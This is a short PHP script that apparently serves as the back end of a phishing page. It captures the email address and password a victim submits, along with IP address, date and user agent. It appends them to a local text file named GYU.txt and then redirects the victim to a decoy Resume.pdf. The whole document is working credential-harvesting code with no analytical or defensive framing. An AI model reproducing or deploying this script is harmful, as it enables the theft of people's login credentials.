<?php 
$fp = fopen("GYU.txt", "a");
$username = $_POST['email']; 
$pws = $_POST['password'];
$ip=$_SERVER["REMOTE_ADDR"];
$date = date("m/d/y G.i:s", time());
$mnp = "\n";
$mnp .= "Name: ".$username."\n";
$mnp .= "Pass: ".$pws."\n";
$mnp .= "IP:   ".$ip."\n";
$mnp .= "Date: ".$date."\n";
$mnp .= "UG: ".$_SERVER['HTTP_USER_AGENT']."\n";
$write = fwrite($fp, $mnp);
fclose($fp) ; 
header ("location:Resume.pdf"); 
exit; 
?> 